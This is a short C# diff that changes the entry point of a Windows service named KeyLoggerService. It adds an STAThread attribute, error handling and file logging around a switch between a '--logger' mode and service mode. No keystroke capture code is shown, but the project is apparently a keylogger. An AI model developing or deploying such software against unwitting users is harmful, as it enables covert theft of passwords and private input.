@@ -12,20 +12,29 @@ namespace KeyLoggerService
         /// <summary>
         /// The main entry point for the application.
         /// </summary>
+        [STAThread]
         static void Main(string[] args)
         {
-            if (args.Length > 0 && args[0] == "--logger")
+            try
             {
-                Service1.RunAsLogger();
-            }
-            else
-            {
-                ServiceBase[] ServicesToRun;
-                ServicesToRun = new ServiceBase[]
+                if (args.Length > 0 && args[0] == "--logger")
                 {
-                    new Service1()
-                };
-                ServiceBase.Run(ServicesToRun);
+                    Service1.RunAsLogger();
+                }
+                else
+                {
+                    Service1.LogToFile("Main: Starting Service mode");
+                    ServiceBase[] ServicesToRun;
+                    ServicesToRun = new ServiceBase[]
+                    {
+                        new Service1()
+                    };
+                    ServiceBase.Run(ServicesToRun);
+                }
+            }
+            catch (Exception ex)
+            {
+                Service1.LogToFile($"Main Fatal Error: {ex.Message}\n{ex.StackTrace}");
             }
         }
     }
